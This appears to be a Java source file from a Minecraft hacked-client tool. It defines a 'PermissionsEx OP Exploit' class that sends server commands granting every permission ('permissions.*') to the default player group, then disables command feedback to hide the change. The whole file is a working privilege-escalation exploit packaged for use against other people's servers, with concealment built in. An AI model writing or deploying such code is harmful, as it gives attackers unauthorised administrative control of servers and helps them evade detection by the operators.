package it.md_4.troy.command.bypass.pex;


import it.md_4.troy.exploit.Exploit;
import it.md_4.troy.exploit.ExploitInfo;
import it.md_4.troy.exploit.ExploitType;
import it.md_4.troy.helper.ChatHelper;
import it.md_4.troy.ip.IpChecker;
import it.md_4.troy.ui.notification.Notification;
import it.md_4.troy.ui.notification.NotificationManager;
import it.md_4.troy.ui.notification.NotificationType;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C01PacketChatMessage;


@ExploitInfo(
        name = "pex",
        type = ExploitType.PEX,
        description = "PermissionsEx OP Exploit"
)
public class PermissionExBypass extends Exploit {

    @Override
    public void execute(Object... args) throws Exception {
        long start = System.currentTimeMillis();
        Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/minecraft:execute @e ~ ~ ~ pex group default add permissions.*"));
        Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/gamerule sendCommandfeedback false"));
        Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/minecraft:gamerule sendCommandfeedback false"));
        ChatHelper.printMessage(String.format("&b • &bSent &8[&7Method: &3%s&7, Time: &3%sms&8]", getName(),
                System.currentTimeMillis() - start));

        NotificationManager.show(new Notification(NotificationType.INFO, "Bypass-:-Pex", "Bypass Launched", 2));
    }
}
